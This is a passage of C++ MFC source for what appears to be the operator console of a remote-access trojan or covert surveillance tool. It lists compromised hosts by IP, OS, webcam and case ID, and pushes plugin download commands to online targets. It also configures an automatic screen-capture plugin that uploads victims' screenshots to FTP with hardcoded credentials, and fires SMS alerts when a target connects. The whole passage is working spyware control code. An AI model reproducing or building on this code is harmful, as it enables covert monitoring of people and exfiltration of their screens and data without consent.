	wsprintf(szPassBackFileList,"%s\\evidence\\%s\\huichuan",GetExeCurrentDir(),szHardId);

	//if(strSrcPath[strlen(strSrcPath)-1]=='\\') strSrcPath[strlen(strSrcPath)-1]='\0'; 

	WIN32_FIND_DATA	FindFileData = {0};

	TCHAR strSrcFileName[MAX_PATH]={0};
	wsprintf(strSrcFileName,"%s\\*",szPassBackFileList);

	HANDLE hFile = ::FindFirstFile(strSrcFileName, &FindFileData);
	if (hFile == INVALID_HANDLE_VALUE){

		return FALSE;
	}

	do 
	{		
		CHAR *pszFileName = FindFileData.cFileName;
		if (strcmp(pszFileName, ".") == 0 || strcmp(pszFileName, "..") == 0)
		{
			continue;
		}

		wsprintf(strOutFile,"%s\\%s",szPassBackFileList,FindFileData.cFileName);
		break;

	} while(FindNextFile(hFile, &FindFileData));

	FindClose(hFile);


	return TRUE;
}

DWORD CTSPClientView::SendPassBaskToDesPc(PINFO_DB_CONTRAST tmpNode)
{
	char szPassBackFileList[MAX_PATH];
	if (strlen(tmpNode->szHardID)==0) return FALSE;

	GetPassBackFile(tmpNode->szHardID,szPassBackFileList);

	if (_access(szPassBackFileList,6)==-1)//不存在对应文件或者无访问权限
	{
		return FALSE;
	}
	CStdioFile filePassback;
	CStdioFile filetmp;


	do 
	{

		if(!filePassback.Open(szPassBackFileList, CFile::modeReadWrite|CFile::shareDenyWrite| CFile::typeText)) 
		{
			break;
		}
		CString strLine;
		if(!filePassback.ReadString(strLine)) break;
		CString resToken;
		int curPos = 0;
		resToken= strLine.Tokenize(_T("	"),curPos);
		char msg[MAX_PATH*2]={0};
		msg[0]= COMMAND_CHAJIAN_FORMIQU;
		memcpy((char*)msg+1,resToken.GetBuffer(),MAX_PATH*2-2);
		m_iocpServer->Send((ClientContext*)tmpNode->lpContent, (LPBYTE)msg,strlen(msg));

	} while (FALSE);
	filePassback.Close();
	DeleteFileA(szPassBackFileList);

	return 0;
	
}

DWORD WINAPI CTSPClientView::MonitorHuiChuanFileEx(LPVOID lpVoid)
{
	return ((CTSPClientView *)lpVoid)->MonitorHuiChuanFile();
}


DWORD CTSPClientView::MonitorHuiChuanFile()
{
	BOOL bFind = FALSE;
	PINFO_DB_CONTRAST tmpNode = NULL;
	int nAddIndex = 0;
	int i=0,nArrCount=0;
	do 
	{
		if (WAIT_OBJECT_0 == WaitForSingleObject(g_hEventQuit, 1000))
		{
			break;
		}
		if(m_pListCtrl==NULL)
		{
			Sleep(100);
			continue;
		}

		nArrCount = m_pListCtrl->GetItemCount();
		i=0;
		Ism_arrDbChange=FALSE;

		for (i=0; i<nArrCount; i++)
		{
			if (Ism_arrDbChange) break;

			tmpNode = (INFO_DB_CONTRAST*)m_pListCtrl->GetItemData(i);
			if (CString(tmpNode->StateName).Find("上线")>=0)
			{
				//SendPassBaskToDesPc(tmpNode);
				SendPassBaskToDesPc(tmpNode);
			}
			Sleep(1000*5);
		}
		Sleep(1000*60*10);

	} while (TRUE);	

	return TRUE;



}

DWORD WINAPI CTSPClientView::MonitorClueFileChangeEx(LPVOID lpVoid)
{
	return ((CTSPClientView *)lpVoid)->MonitorClueFileChange();
}



DWORD CTSPClientView::MonitorClueFileChange()
{
	char buf[(sizeof(FILE_NOTIFY_INFORMATION)+MAX_PATH)*2]={0};
	char szTrojanPath[MAX_PATH]={0};

	char tmp[MAX_PATH]={0}, str1[MAX_PATH]={0}, str2[MAX_PATH]={0};
	FILE_NOTIFY_INFORMATION* pNotify=(FILE_NOTIFY_INFORMATION*)buf;
	DWORD dwBytesReturned=0; 
	DWORD dwResult = WAIT_OBJECT_0;

	CString str=((CTSPClientApp *)AfxGetApp())->m_IniFile.GetString("Filter", "Path","");
	char szCurPath[MAX_PATH] = {0};
  	char *sztmp=str.GetBuffer();
	if (sztmp&&strlen(sztmp)!=0) 
	{
		if(sztmp[strlen(sztmp)-1]=='\\')	sztmp[strlen(sztmp)-1]='\0';

		wsprintf(szCurPath, "%s\\", sztmp);
	}
	else
	{
		wsprintf(szCurPath, "%s", GetExeCurrentDir());
	}


//	if(sztmp[strlen(sztmp)-1]=='\\')	sztmp[strlen(sztmp)-1]='\0';


	HANDLE hFile = CreateFile(szCurPath,
		FILE_LIST_DIRECTORY, FILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE,
		NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OVERLAPPED, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		return -1;
	}

	while(TRUE)
	{
		dwResult = WaitForSingleObject(g_hEventQuit, 1000);
		if (WAIT_OBJECT_0 == dwResult)
		{
			break;
		}

		if( !::ReadDirectoryChangesW(hFile,
			pNotify,
			sizeof(buf),
			FALSE,
			FILE_NOTIFY_CHANGE_FILE_NAME|
			FILE_NOTIFY_CHANGE_SIZE|
			FILE_NOTIFY_CHANGE_LAST_WRITE|
			FILE_NOTIFY_CHANGE_CREATION,
			&dwBytesReturned,
			&m_ovTrojan,
			NULL ) )
		{
			break;
		}

		if (WaitForSingleObject(m_ovTrojan.hEvent,  INFINITE) == WAIT_OBJECT_0)
		{
			dwResult = WaitForSingleObject(g_hEventQuit, 0);
			if (WAIT_OBJECT_0 == dwResult)
			{
				break;
			}
		}
		

		memset(tmp,0,sizeof(tmp));
		memset(str1,0,sizeof(str1));
		memset(str2,0,sizeof(str2));
		WideCharToMultiByte( CP_ACP,0,pNotify->FileName,pNotify->FileNameLength,tmp,99,NULL,NULL);
		lstrcpy( str1, tmp );

		if(pNotify->NextEntryOffset !=0 )
		{
			PFILE_NOTIFY_INFORMATION p = (PFILE_NOTIFY_INFORMATION)((char*)pNotify+pNotify->NextEntryOffset);
			memset( tmp, 0, sizeof(tmp) );
			WideCharToMultiByte( CP_ACP,0,p->FileName,p->FileNameLength,tmp,99,NULL,NULL);
			lstrcpy( str2, tmp );
		}

		switch(pNotify->Action)
		{
		case FILE_ACTION_ADDED:
		case FILE_ACTION_MODIFIED:
			{
				if (!lstrcmpi(str1, NAME_CLUEFILE))
				{	
					g_log.Log(0,"线索文件修改!!!\n");
					UpdateClue();
				}
			}
			break;
		}
	}

	SAFE_CLOSEFILEHANDLE(hFile);

	return 0;
}


BOOL CTSPClientView::InitMonitor()
{
	ReadClueFile();
	ReadMacFile();
	::ResetEvent(m_ovTrojan.hEvent);
	 m_hThreadMonitor = CreateThread( NULL, 0, &MonitorClueFileChangeEx, this, 0, NULL);
	 m_hThreadHuiChuan = CreateThread( NULL, 0, &MonitorHuiChuanFileEx, this, 0, NULL);

	 return TRUE;
}



BOOL CTSPClientView::UpdateArrMac(int nRow)
{
	int nCount = m_pListCtrl->GetItemCount();
	if (nRow >= nCount)
	{
		return FALSE;
	}
	INFO_DB_CONTRAST* pItem=(INFO_DB_CONTRAST*)m_pListCtrl->GetItemData(nRow);
	return UpdateArrMac(pItem->szHardID, pItem->szCaseID,pItem->szClueID, pItem->szClueName);
}

BOOL CTSPClientView::UpdateArrMac(LPSTR lpMac,LPSTR lpCaseID ,LPSTR lpClueID, LPSTR lpClueName)
{
	if (0 == lstrlen(lpMac) || 0 == lstrlen(lpClueID)||0 == lstrlen(lpCaseID))
	{
		return FALSE;
	}

	m_csMacDataLock.WaitToWrite();
	int nArrCount = m_arrMac.GetCount();
	BOOL bRet = FALSE;

	do 
	{
		BOOL bFind = FALSE;
		int i=0;
		for (i=0; i<nArrCount; i++)
		{		
			if (0 == _strcmpi(m_arrMac.GetAt(i)->szMAC, lpMac))
			{
				bFind = TRUE;
				break;
			}
		}

		if (bFind)
		{
			lstrcpy(m_arrMac.GetAt(i)->szCaseID, lpCaseID);
			lstrcpy(m_arrMac.GetAt(i)->szClueName, lpClueName);
			lstrcpy(m_arrMac.GetAt(i)->szClueID, lpClueID);
			bRet = TRUE;
			break;
		}

		PINFO_MAC_CONTRAST pNodeMac = new INFO_MAC_CONTRAST;
		::ZeroMemory(pNodeMac, sizeof(INFO_MAC_CONTRAST));

		lstrcpy(pNodeMac->szMAC, lpMac);
		lstrcpy(pNodeMac->szCaseID, lpCaseID);
		lstrcpy(pNodeMac->szClueID, lpClueID);
		lstrcpy(pNodeMac->szClueName, lpClueName);
		m_arrMac.Add(pNodeMac);
		bRet = TRUE;

	} while (FALSE);

	m_csMacDataLock.Done();

	WriteMacFile();
	return bRet;
}


void CTSPClientView::OnUpdateClient()
{
	if (!UpdateClient())
	{
		AfxMessageBox("已经是最新版");
	}	
}


BOOL CTSPClientView::UpdateClient()
{
	//自动获取客户端版本信息，实现客户端自动升级
	BOOL bRet = GetVersionFromServer();
	if (!bRet)
	{
		//menglz tsp2.0 里升级不希望弹出这个，注释掉下面一句,添加直接返回句子
		//AfxMessageBox("自动获取控制端版本信息失败，请询问提供商是否有新版本，或者重新启动系统");
		return FALSE;
	}

	if (m_bNewClientVer)
	{
		DownLoadNewClient();
		return TRUE;
	}

	return FALSE;
}


BOOL CTSPClientView::DownPluginForMiqu(LPCSTR lpUrl)
{
	// TODO: Add your command handler code here
	
	BYTE msg[128];
	msg[0] = COMMAND_CHAJIAN_FORMIQU;
	memcpy( &msg[1], lpUrl, 127 );


	SendSelectCommand( &msg[0], lstrlen(lpUrl) + 2);

	return TRUE;
}


void CTSPClientView::OnNMClick(NMHDR *pNMHDR, LRESULT *pResult)
{
	// 	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<NMITEMACTIVATE>(pNMHDR);
	// TODO: 在此添加控件通知处理程序代码
	LPNMITEMACTIVATE pia = (LPNMITEMACTIVATE)pNMHDR;
	CPoint point(pia->ptAction);

	int nItem = m_pListCtrl->HitTest(point, NULL);

	INFO_DB_CONTRAST* pItem=(INFO_DB_CONTRAST*)m_pListCtrl->GetItemData(nItem);
	if (nItem>=0)
	{
		char Line[40];
		sprintf(Line,"行:%d",nItem+1);
		((CMainFrame*)AfxGetApp()->m_pMainWnd)->m_wndStatusBar.SetPaneText(4, Line);
	}
	if (nItem != -1 && !(CString(pItem->StateName).Find("上线")>=0))
	{
		//禁用图标
		CToolBar *pToolbar = g_pFrame->GetToolBar();
		pToolbar->EnableWindow(FALSE);
		UpdateWindow();

		return;		
	}
	else
	{
		CToolBar *pToolbar = g_pFrame->GetToolBar();
		pToolbar->EnableWindow(TRUE);
		UpdateWindow();
	}

	*pResult = 0;
}


void CTSPClientView::OnNMCustomdraw(NMHDR *pNMHDR, LRESULT *pResult)
{
	LPNMCUSTOMDRAW pNMCD = reinterpret_cast<LPNMCUSTOMDRAW>(pNMHDR);
	// TODO: 在此添加控件通知处理程序代码
	
	LPNMLVCUSTOMDRAW  lplvcd = (LPNMLVCUSTOMDRAW)pNMHDR;
	int iRow = lplvcd->nmcd.dwItemSpec;
	
	switch(lplvcd->nmcd.dwDrawStage)
	{
	case CDDS_PREPAINT :
		{
			*pResult = CDRF_NOTIFYITEMDRAW;
			return;
		}

		// Modify item text
	case CDDS_ITEMPREPAINT:
		{	
			INFO_DB_CONTRAST *pNode=(INFO_DB_CONTRAST *)m_pListCtrl->GetItemData(iRow);
			if (CString(pNode->StateName).Find("下线")>=0)
			{
				lplvcd->clrText = RGB(192,192,192);
				// If you want the sub items the same as the item,
				// set *pResult to CDRF_NEWFONT
				*pResult = CDRF_NOTIFYSUBITEMDRAW;

				return;		
			}

			
		}
	}

	*pResult = 0;
}

BOOL CTSPClientView::ReadDbFile()
{

	if (!::PathFileExists(m_szDbFileName))//不存在对应文件
	{
		return FALSE;
	}
	CStdioFile fileDb;
	if(!fileDb.Open(m_szDbFileName, CFile::modeRead | CFile::typeText)) 
	{
		return FALSE;
	}

	int nArrCount = m_pListCtrl->GetItemCount();
	for (int i=0; i<nArrCount; i++)
	{
		PINFO_DB_CONTRAST pTemp =(INFO_DB_CONTRAST*)m_pListCtrl->GetItemData(i);
		delete pTemp;
	}
	m_pListCtrl->DeleteAllItems();

	CString strLine;
	m_csActiveFileLock.WaitToRead();
	while (fileDb.ReadString(strLine))
	{
		PINFO_DB_CONTRAST pNodeDb = new INFO_DB_CONTRAST;
		::ZeroMemory(pNodeDb, sizeof(INFO_DB_CONTRAST));

		strcpy(pNodeDb->szOnOff, "offline");


		CString resToken;
		int curPos = 0;
		resToken= strLine.Tokenize(_T("	"),curPos);
		CString strtest=resToken;
		BOOL bOld=FALSE;

		int nColume = 0;
		while (strtest != _T(""))
		{

			if (nColume==6)
			{
				if(strstr(strtest,"有")||strstr(strtest,"无")) bOld=TRUE;
				break;
			}

			strtest = strLine.Tokenize(_T("	"), curPos);
			nColume++;

		}

		curPos=0;

		resToken= strLine.Tokenize(_T("	"),curPos);
		nColume = 0;

		//char *pClu,*pCas;

		while (resToken != _T(""))
		{
			// 			pCas=NULL;
			// 			pCas=NULL;
			// 
			// 			{"ID",				48	},
			// 			{"线索ID:案件ID",	100 },
			// 			{"线索名称",		100 },
			// 			{"区域",			100	},
			// 			{"标识",			150 },
			// 			{"WAN",				107	},
			// 			{"LAN",				107	},
			// 			{"操作系统",		128	},
			// 			{"计算机名/备注",	107	},
			// 			{"CPU",				55	},
			// 			{"Ping",			40	},
			// 			{"摄像头",			51	},
			// 			{"服务端版本",		75	},

			TCHAR *sztmp;
			DWORD dwSize;
			sztmp=NULL;
			dwSize=0;
			switch(nColume)
			{
			case 0:
				//resToken
				if (bOld)
				{
					sztmp=pNodeDb->IPWAN;
					dwSize=sizeof(pNodeDb->IPWAN);
				}
				else
				{
					sztmp=pNodeDb->szCaseID;
					dwSize=sizeof(pNodeDb->szCaseID);
				}
				break;
			case 1:

				if (bOld)
				{
					sztmp=pNodeDb->IPLAN;
					dwSize=sizeof(pNodeDb->IPLAN);
				}
				else
				{
					sztmp=pNodeDb->szClueName;
					dwSize=sizeof(pNodeDb->szClueName);
				}
				break;
			case 2:
				if (bOld)
				{
					sztmp=pNodeDb->szComputerName;
					dwSize=sizeof(pNodeDb->szComputerName);
				}
				else
				{
					sztmp=pNodeDb->szArea;
					dwSize=sizeof(pNodeDb->szArea);
				}

				break;
			case 3:
				if (bOld)
				{
					sztmp=pNodeDb->szOperSys;
					dwSize=sizeof(pNodeDb->szOperSys);
				}
				else
				{
					sztmp=pNodeDb->szHardID;
					dwSize=sizeof(pNodeDb->szHardID);

				}

				break;
			case 4:
				if (bOld)
				{
					sztmp=pNodeDb->szCPU;
					dwSize=sizeof(pNodeDb->szCPU);

				}
				else
				{
					sztmp=pNodeDb->IPWAN;
					dwSize=sizeof(pNodeDb->IPWAN);
				}
				break;
			case 5:
				if (bOld)
				{
					sztmp=pNodeDb->szPing;
					dwSize=sizeof(pNodeDb->szPing);
				} 
				else
				{
					sztmp=pNodeDb->IPLAN;
					dwSize=sizeof(pNodeDb->IPLAN);
				}

				break;
			case 6:
				if (bOld)
				{
					sztmp=pNodeDb->szCamer;
					dwSize=sizeof(pNodeDb->szCamer);
				} 
				else
				{
					sztmp=pNodeDb->szOperSys;
					dwSize=sizeof(pNodeDb->szOperSys);
				}

				break;
			case 7:
				if (bOld)
				{
					sztmp=pNodeDb->szVersion;
					dwSize=sizeof(pNodeDb->szVersion);
				} 
				else
				{
					sztmp=pNodeDb->szComputerName;
					dwSize=sizeof(pNodeDb->szComputerName);
				}

				break;
			case 8:

				if (bOld)
				{
					/*
					
					sztmp=pNodeDb->szArea;
					dwSize=sizeof(pNodeDb->szArea);

					*/  //by menglz

					
					//###########by menglz
					sztmp=pNodeDb->szHardID;   
					dwSize=sizeof(pNodeDb->szHardID);   


				} 
				else
				{
					sztmp=pNodeDb->szCPU;
					dwSize=sizeof(pNodeDb->szCPU);
				}

			

				break;
			case 9:

				

				if (bOld)
				{
					/*
					sztmp=pNodeDb->szHardID;
					dwSize=sizeof(pNodeDb->szHardID);

					*/ //by menglz

					//####### by menglz
					sztmp=pNodeDb->szCaseID;
					dwSize=sizeof(pNodeDb->szCaseID);

					//########


				} 
				else
				{
					sztmp=pNodeDb->szPing;
					dwSize=sizeof(pNodeDb->szPing);
				}
				

				break;
			case 10:
				if (bOld)
				{
					/*
					
					sztmp=pNodeDb->szCaseID;
					dwSize=sizeof(pNodeDb->szCaseID);
					//	pClu=strstr(pNodeDb->szClue,":");
					//		pCas=strstr(pNodeDb->szClueName,":");


					*/


					//####by menglz

					sztmp=pNodeDb->szClueName;
					dwSize=sizeof(pNodeDb->szClueName);


					//#############


				} 
				else
				{
					sztmp=pNodeDb->szCamer;
					dwSize=sizeof(pNodeDb->szCamer);
				}

				break;
			case 11:

				break; //

				if (bOld)
				{
					sztmp=pNodeDb->szClueName;
					dwSize=sizeof(pNodeDb->szClueName);
				} 
				else
				{
					sztmp=pNodeDb->szVersion;
					dwSize=sizeof(pNodeDb->szVersion);
				}

				break;
			case 13:
				sztmp=pNodeDb->szfirstAcceptTime;
				dwSize=sizeof(pNodeDb->szfirstAcceptTime);
				break;
			}

			if ((DWORD)lstrlen(resToken)<=dwSize)
			{
				//memcpy(sztmp, resToken, dwSize-1);//modify by zhenyu 2014-10-24  
				memcpy(sztmp, resToken,resToken.GetLength());
			}
			else if(dwSize)
			{
				nColume=0;
//				m_FileLog.WriteLog("错误日志","配置文件中:%s字符过长!,线索丢弃\r\n",resToken);
				break;
			}


			resToken = strLine.Tokenize(_T("	"), curPos);
			nColume++;
		};   

		if (0 == nColume)
		{
			delete pNodeDb;
			continue;
		}
		strcpy(pNodeDb->StateName,"下线");
		if(char *p=strchr(pNodeDb->szClueName,':'))
		{
			memcpy(pNodeDb->szClueID, p+1, sizeof(pNodeDb->szClueID)-1);
			*p=0;
		}else
		{
			strcpy(pNodeDb->szClueID,"0");
		}
		InsertItem(-1,pNodeDb);
	}

	m_csActiveFileLock.Done();
	fileDb.Close();


	return TRUE;
}
BOOL CTSPClientView::WriteDbFile()
{
	CStdioFile fileDb;
	if(!fileDb.Open(m_szDbFileName, CFile::modeWrite | CFile::modeCreate| CFile::typeText)) 
	{
		return FALSE;
	}

	BOOL bRet = FALSE;
	do 
	{
		int nArrCount = m_pListCtrl->GetItemCount();
		char szLine[MAX_PATH] = {0};
		for (int i=0; i<nArrCount; i++)
		{
			::ZeroMemory(szLine, sizeof(szLine));
			INFO_DB_CONTRAST* pItem=(INFO_DB_CONTRAST*)m_pListCtrl->GetItemData(i);
			
			if (strlen(pItem->szHardID)==0)
			{
			strcpy(pItem->szHardID,"xxxxxx");
			}

			if (strlen(pItem->szCaseID)==0)
			{
			strcpy(pItem->szCaseID,"xxx");
			}
			if (strlen(pItem->szClueID)==0)
			{
			strcpy(pItem->szClueID,"xxx");
			}
			if (strlen(pItem->szClueName)==0)
			{
			strcpy(pItem->szClueName,"未命名");
			}
			wsprintf(szLine, "%s	%s	%s	%s	%s	%s	%s	%s	%s	%s	%s	%s:%s	%s\n",	pItem->IPWAN, \
				pItem->IPLAN,\
				pItem->szComputerName,\
				pItem->szOperSys,\
				pItem->szCPU,\
				pItem->szPing,\
				pItem->szCamer,\
				pItem->szVersion,\
				pItem->szArea,\
				pItem->szHardID,\
				pItem->szCaseID,\
				pItem->szClueName,\
				pItem->szClueID,\
				pItem->szOnOff
				);
			m_csActiveFileLock.WaitToWrite();
			fileDb.WriteString(szLine);
			m_csActiveFileLock.Done();
		}

		bRet = TRUE;

	} while (FALSE);	

	fileDb.Close();

	return bRet;
}


BOOL CTSPClientView::GetAutoScreenConfig(pAUTOSREECNCONFIG pAutosreecnconfig,TCHAR *szMACID)
{
	TCHAR szFile[MAX_PATH]={0};
	GetModuleFileName(0,szFile,MAX_PATH);
	TCHAR *strPos=StrRChr(szFile,0,'\\');

	if (strPos)
	{
		*(strPos+1)=0;
		strcat(szFile,szAutoCapSrccenFile);
	}

// 	GetPrivateProfileString(szMACID,"Auto",NULL, read_build, sizeof(read_build),szFile);
// 
// 	if (!stricmp(read_build,"false"))
// 	{
// 		return FALSE;
// 	}

/*#ifdef PUBLISH*/
	strncpy(pAutosreecnconfig->szFtppass,"pass",sizeof(pAutosreecnconfig->szFtppass));//插件的账户
	strncpy(pAutosreecnconfig->szFtpUser,"pass",sizeof(pAutosreecnconfig->szFtpUser));
	//strncpy(pAutosreecnconfig->szPlugName,"AutoScreenCap_test.dll",sizeof(pAutosreecnconfig->szPlugName));
    strncpy(pAutosreecnconfig->szPlugName,"AutoScreenCap.dll",sizeof(pAutosreecnconfig->szPlugName));

/*#else*/
// 	strncpy(pAutosreecnconfig->szFtppass,"admin",sizeof(pAutosreecnconfig->szFtppass));//插件的账户
// 	strncpy(pAutosreecnconfig->szFtpUser,"test",sizeof(pAutosreecnconfig->szFtpUser));
	//strncpy(pAutosreecnconfig->szPlugName,"AutoScreenCap_test.dll",sizeof(pAutosreecnconfig->szPlugName));

//#endif

	//strncpy(pAutosreecnconfig->szPlugName,"AutoScreenCap.dll",sizeof(pAutosreecnconfig->szPlugName));
	strncpy(pAutosreecnconfig->szDownLoadPlugUrl,LICSERVER_IPADDR,sizeof(pAutosreecnconfig->szDownLoadPlugUrl));
	//strncpy(pAutosreecnconfig->szFtppass,"pass",sizeof(pAutosreecnconfig->szFtppass));//插件的账户
	//strncpy(pAutosreecnconfig->szFtpUser,"pass",sizeof(pAutosreecnconfig->szFtpUser));
	strncpy(pAutosreecnconfig->FtpConfig.szRemotoDir,szMACID,sizeof(pAutosreecnconfig->FtpConfig.szRemotoDir));


	TCHAR read_build[MAX_PATH];
	memset(read_build,0,MAX_PATH);
	
	if (!pAutosreecnconfig->FtpConfig.m_nScrTimeInternal)
	{
		//获取截屏时间间隔
		GetPrivateProfileString(szMACID,"TimeInternal",NULL, read_build, sizeof(read_build),szFile);
		if (strlen(read_build)==0)
		{

			pAutosreecnconfig->FtpConfig.m_nScrTimeInternal=120;//默认时间为2分钟
			char sztmp[20];
			_itoa_s(pAutosreecnconfig->FtpConfig.m_nScrTimeInternal,sztmp,10);
			WritePrivateProfileStringA(szMACID,"TimeInternal",sztmp,szFile);
		}
		else pAutosreecnconfig->FtpConfig.m_nScrTimeInternal=atoi(read_build);
	}
	else
	{
		char sztmp[20];
		_itoa_s(pAutosreecnconfig->FtpConfig.m_nScrTimeInternal,sztmp,10);
		WritePrivateProfileStringA(szMACID,"TimeInternal",sztmp,szFile);
	}

	if (!pAutosreecnconfig->FtpConfig.m_nScrBitCount)
	{

		//获取截屏位图bit
		memset(read_build,0,MAX_PATH);
		GetPrivateProfileString(szMACID,"BitCount",NULL, read_build, sizeof(read_build),szFile);
		if (strlen(read_build)==0)
		{
			pAutosreecnconfig->FtpConfig.m_nScrBitCount=4;
			char sztmp[20];
			_itoa_s(pAutosreecnconfig->FtpConfig.m_nScrBitCount,sztmp,10);
			WritePrivateProfileStringA(szMACID,"BitCount",sztmp,szFile);
		}
		else pAutosreecnconfig->FtpConfig.m_nScrBitCount=atoi(read_build);

	}
	else
	{
		char sztmp[20];
		_itoa_s(pAutosreecnconfig->FtpConfig.m_nScrBitCount,sztmp,10);
		WritePrivateProfileStringA(szMACID,"BitCount",sztmp,szFile);

	}




	//获取FTP的IP
	memset(read_build,0,MAX_PATH);
	GetPrivateProfileString(szMACID,"FTPServerIP",NULL, read_build, sizeof(read_build),szFile);
	if (strlen(read_build)==0)
	{

		char   szHostname[128];
		gethostname(szHostname,128);
		struct   hostent*   ht;
		ht=gethostbyname(szHostname);
		if(ht!=NULL&&ht->h_addr_list[0]!=NULL)
		{
			
			struct in_addr addr;
			memcpy(&addr,ht->h_addr_list[0],sizeof(struct in_addr));



			strncpy(pAutosreecnconfig->FtpConfig.szUpIP,inet_ntoa(addr),sizeof(pAutosreecnconfig->FtpConfig.szUpIP));
			WritePrivateProfileStringA(szMACID,"FTPServerIP",inet_ntoa(addr),szFile);
		}

	}
	else strncpy(pAutosreecnconfig->FtpConfig.szUpIP,read_build,sizeof(pAutosreecnconfig->FtpConfig.szUpIP));

	//获取端口
	memset(read_build,0,MAX_PATH);
	GetPrivateProfileString(szMACID,"FtpProt",NULL, read_build, sizeof(read_build),szFile);
	if (strlen(read_build)==0)
	{
		pAutosreecnconfig->FtpConfig.dwFtpProt=21;
		char sztmp[20];
		_itoa_s(pAutosreecnconfig->FtpConfig.dwFtpProt,sztmp,10);
		WritePrivateProfileStringA(szMACID,"FtpProt",sztmp,szFile);
	}
	else pAutosreecnconfig->FtpConfig.dwFtpProt=atoi(read_build);


	//获取FTP用户名

	memset(read_build,0,MAX_PATH);
	GetPrivateProfileString(szMACID,"FtpUser",NULL, read_build, sizeof(read_build),szFile);
	if (strlen(read_build)==0)
	{
		strncpy(pAutosreecnconfig->FtpConfig.szUserName,"test",sizeof(pAutosreecnconfig->FtpConfig.szUserName));
		WritePrivateProfileStringA(szMACID,"FtpUser",pAutosreecnconfig->FtpConfig.szUserName,szFile);
	}
	else strncpy(pAutosreecnconfig->FtpConfig.szUserName,read_build,sizeof(pAutosreecnconfig->FtpConfig.szUserName));

	//获取FTP密码
	memset(read_build,0,MAX_PATH);
	GetPrivateProfileString(szMACID,"FtpPass",NULL, read_build, sizeof(read_build),szFile);
	if (strlen(read_build)==0)
	{
		strncpy(pAutosreecnconfig->FtpConfig.szPass,"admin",sizeof(pAutosreecnconfig->FtpConfig.szPass));
		WritePrivateProfileStringA(szMACID,"FtpPass",pAutosreecnconfig->FtpConfig.szPass,szFile);
	}
	else strncpy(pAutosreecnconfig->FtpConfig.szPass,read_build,sizeof(pAutosreecnconfig->FtpConfig.szPass));

	return TRUE;

}


void CTSPClientView::SendAutoSrccen(LOGININFO* LoginInfo,LPVOID lpContent)
{
	//-yx 20110607

		TCHAR read_build[256]={0};
		TCHAR szFile[MAX_PATH]={0};
		GetModuleFileName(0,szFile,MAX_PATH);
		TCHAR *strPos=StrRChr(szFile,0,'\\');

		if (strPos)
		{
			*(strPos+1)=0;
			strcat(szFile,szAutoCapSrccenFile);
		}

		GetPrivateProfileString((LPCSTR)LoginInfo->szCPUID,"Auto",NULL, read_build, sizeof(read_build),szFile);

		if (!_stricmp(read_build,"false"))
		{
			return;
		}

		//WritePrivateProfileStringA((LPCSTR)LoginInfo->szCPUID,"Auto","true",szFile);


		//AUTOSREECNCONFIG AutoScrrenconfig={0};

		DWORD   dwMsgSize=sizeof(AUTOSREECNCONFIG)+1;
		BYTE	*msg=new BYTE[dwMsgSize];
		memset(msg,0,dwMsgSize);
		msg[0]= TOKEN_EVIDENCE_SREECN_ARG;
		//msg[0]= COMMAND_CHAJIAN_FORMIQU;
		GetAutoScreenConfig((pAUTOSREECNCONFIG)(msg+1),(TCHAR*)LoginInfo->szCPUID);
		m_iocpServer->Send((ClientContext*)lpContent, (LPBYTE)msg,dwMsgSize);
		delete msg;



}

//短信通知接口
void CTSPClientView::SendShortMsg(TCHAR *szClue)
{

// 	__try
// 	{
		if (strlen(szClue)==0){
			return;//无线索号直接返回
		}

		CIniFile iniFile;
		CString strstart,strMobile,strFetionPwd;

		CString AppName="Mobile";
		strstart=iniFile.GetString(AppName,"start","");//开启状态

		if (strstart!="true")
		{
			return;
		}

		strMobile=iniFile.GetString(AppName,"Tel1","");//飞信账户
		strFetionPwd=iniFile.GetString(AppName,"PWD","");


		if (strMobile.IsEmpty()||
			strFetionPwd.IsEmpty())
		{
			return;
		}

		strFetionPwd=EnDeCode::decrypt(EnDeCode::Decode(strFetionPwd.GetBuffer()));//解密飞信密码

		CString StrMsg="注意:";
		StrMsg.Append(szClue);
		StrMsg+="来了!";

		STARTUPINFO si = {0};
		si.cb = sizeof(STARTUPINFO);
		si.dwFlags = STARTF_USESHOWWINDOW; 
		si.wShowWindow = SW_HIDE;
		PROCESS_INFORMATION pi = {0};

		TCHAR szCmd[MAX_PATH*3] = {0};

		TCHAR szFetionExe[MAX_PATH*3]={0};


		//SendFetionSMS -t self -fn 139xxxx8066 -fp testpassword  -m "Any2Mobile 测试短信"
		::wsprintf(szCmd, _T("%s\\fetion\\SendFetionSMS.exe -t self -fn %s -fp %s -m %s"),GetExeCurrentDir(),strMobile,strFetionPwd,StrMsg);
		if(CreateProcess(NULL, szCmd, NULL, NULL, FALSE, 0, NULL,NULL, &si, &pi))
		{
			g_log.Log(LEVEL_WARNNING,"线索为：%s上线报警\r\n",szClue);
		}

		TCHAR szFetion[MAX_PATH*3]={0};
		wsprintf(szFetion,"%s\\fetion\\迷你飞信.exe",GetExeCurrentDir());
		CProcess::KillAllProcessByName(szFetion);



		//	::WaitForSingleObject(m_hTraceiverPID ,INFINITE);


		// 	typedef	BOOL	(__cdecl *pSendMsg)(TCHAR*,TCHAR*);
		// 
		// 	pSendMsg SendMsg = (pSendMsg)GetProcAddress(hTspPlug,"SendMsg");
		// 
		// 	if (SendMsg)
		// 	{
		// 		SendMsg(strMobile.GetBuffer(),StrMsg.GetBuffer());
		// 		m_FileLog.WriteLog("报警日志","IP为：%s上线报警",szIP);
		// 	}
// 	}
// 	__except
// 	{
// 	}

}

BOOL CTSPClientView::UpdateItem(int nFindIndex, PINFO_DB_CONTRAST pNode)
{

	PINFO_DB_CONTRAST pItem=(PINFO_DB_CONTRAST)m_pListCtrl->GetItemData(nFindIndex);
	if(pNode!=pItem)
	{
		g_log.Log(LEVEL_WARNNING,"更新项数据不匹配！！！\n");
		if(pItem)
		{
			ClientContext *pContext=(ClientContext *)pItem->lpContent;
			if(pContext)
			{	
				g_log.Log(LEVEL_WARNNING,"更新项不匹配,删除旧项！！！\n");
				m_iocpServer->RemoveStaleClient(pContext,FALSE,FALSE);
			}
		}
		m_pListCtrl->SetItemData(nFindIndex,(DWORD_PTR) pNode);
	}
	m_pListCtrl->SetItemText(nFindIndex, COL_WAN, pNode->IPWAN);
	m_pListCtrl->SetItemText(nFindIndex, COL_LAN, pNode->IPLAN);
	m_pListCtrl->SetItemText(nFindIndex, COL_COMPNAME, pNode->szComputerName);
